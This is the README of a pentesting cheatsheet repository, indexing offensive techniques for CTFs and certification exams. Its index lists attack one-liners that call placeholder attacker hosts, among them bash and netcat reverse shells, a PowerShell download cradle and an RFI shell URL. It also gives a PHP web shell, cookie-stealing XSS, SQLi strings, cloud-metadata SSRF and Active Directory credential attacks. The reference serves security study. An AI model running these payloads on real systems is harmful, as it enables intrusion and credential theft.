# Cybersecurity-Cheatsheets

Welcome! This repository contains a curated collection of cheatsheets and personal notes on cybersecurity, pentesting, and ethical hacking.They are designed to be a quick reference during a CTF, a certification exam (like OSCP/OSCE), or a real-world pentesting engagement.> load index.dat...$ tree .
.
├── LICENSE
├── README.md
├── 📂 Enumeration
│   ├── Nmap.md
│   ├── Recon-Web.md
│   └── SMB-LDAP.md
├── 📂 Web-Pentesting
│   ├── SQLi.md
│   ├── XSS.md
│   ├── LFI-RFI.md
│   └── SSRF-XXE.md
├── 📂 Priv-Escalation
│   ├── Linux.md
│   └── Windows.md
├── 📂 Active-Directory
│   ├── Kerberos.md
│   ├── Credential-Attacks.md
│   └── Bloodhound.md
├── 📂 Shells
│   ├── Reverse-Shells.md
│   ├── TTY-Upgrade.md
│   └── Web-Shells.md
└── 📂 Red-Teaming
    ├── C2-Frameworks.md
    ├── Payload-Generation.md
    └── Persistence.md

10 directories, 20 files
📚 Detailed Content IndexThis is the main knowledge base. The table is designed so you can quickly find the command or technique you need.CategoryKey Topics, Techniques, and Commands (Examples)Quick Link📍 Enumeration• Network Scanning:  nmap -sC -sV -p- <ip> (Base scan)  nmap -sU (UDP Scan)  masscan -p1-65535 <ip> --rate=1000• Web Enumeration:  gobuster dir -u <url> -w <list>  feroxbuster -u <url> -w <list>  nikto -h <url> (Vulnerability scanner)  whatweb <url> (Technology identification)• SMB/Windows Enumeration:  enum4linux -a <ip>  smbclient -L //<ip>  nbtscan <ip-range>• DNS/Subdomain Enumeration:  dig axfr @<dns-server> <domain>  subfinder -d <domain>View Section🌐 Web Pentesting• SQL Injection (SQLi):  sqlmap -u "<url>" --dbs --batch  Comments:  ' OR 1=1 -- - /  ' OR 1=1 #   Stacking: '; COMMAND --• Cross-Site Scripting (XSS):  Reflected: <script>alert(1)</script>  Stored: "><img src=x onerror=alert(document.cookie)>  Filter Bypass (e.g., onmouseover)• File Inclusion (LFI / RFI):  LFI: ../../etc/passwd  PHP Wrappers: php://filter/convert.base64-encode/resource=  RFI: http://<attacker-ip>/shell.txt?• Server-Side Request Forgery (SSRF):  Metadata Access (AWS, GCP): http://169.254.169.254/  Internal Port Scan: http://localhost:22• Other Vulnerabilities:  XXE (XML External Entity)  Insecure Deserialization  OS Command InjectionView Section📈 Priv. Escalation• Linux:  SUID Binaries: find / -perm -u=s -type f 2>/dev/null  (GTFOBins: find, cp, nmap...)  Cron Jobs: ls -la /etc/cron.d  Capabilities: getcap -r / 2>/dev/null  sudo -l (Sudo rules)  Kernel Exploits (LinPEAS / Linux-Exploit-Suggester)• Windows:  Services (Weak Permissions, Unquoted Paths):  sc qc <servicename>  icacls <service_binary>  Tokens: incognito.exe, JuicyPotato.exe  DLL Hijacking  AutoRuns / Registry Keys  Files (Unattend.xml, SAM/SYSTEM backup)LinuxWindows💻 Active Directory• Initial Enumeration:  PowerView: Get-NetUser, Get-NetGroup  BloodHound (Ingestors: SharpHound.exe / .ps1)• Kerberos Attacks:  Kerberoasting: GetUserSPNs.py (impacket)  AS-REP Roasting: GetNPUsers.py (impacket)<B• Credential Attacks:  Pass-the-Hash (PtH): psexec.py <user>@<ip>  Pass-the-Ticket (PtT)  Golden / Silver Tickets (Mimikatz)• Lateral Movement & Dominance:  DCSync (krbtgt hash)  evil-winrm -i <ip> -u <user> -p <pass>View Section🐚 Shells & TTYs• Reverse Shells (One-liners):  Bash: bash -i >& /dev/tcp/<ip>/<port> 0>&1  Python: python -c 'import socket...'  PowerShell: IEX (New-Object Net.WebClient)...  Netcat: nc -e /bin/bash <ip> <port>• Listeners:  nc -lvnp <port>  rlwrap nc -lvnp <port> (with history)  socat file:tty,raw,echo=0 tcp-listen:<port>• Full TTY Upgrade:  1. python -c 'import pty; pty.spawn("/bin/bash")'  2. Ctrl+Z (background)  3. stty raw -echo; fg  4. export TERM=xterm• Web Shells:  PHP: <?php system($_GET['cmd']); ?>  ASPX: (e.g., Antak, Weevely)View Section🔴 Red Teaming• C2 Frameworks:  Metasploit: multi/handler, Meterpreter  Cobalt Strike (Malleable C2 profiles)  Empire (PowerShell / Python)• Payload Generation:  msfvenom -p <payload> LHOST=... LPORT=... -f <format>  Staged vs. Stageless  Shellcode (C#, VBA)• Defense Evasion:  AMSI Bypass (PowerShell)  Payload Obfuscation  Living Off The Land (LOLBAS): certutil, bitsadminView Section⚠️ DisclaimerThese are my personal notes, shared publicly for the purpose of helping other students and serving as a quick reference for myself. I am not responsible for the misuse of this information.All information contained herein is intended for educational and ethical hacking purposes (authorized labs, CTFs, etc.).Although I strive for the commands to be accurate, always check and understand a command before executing it in a live or sensitive environment.
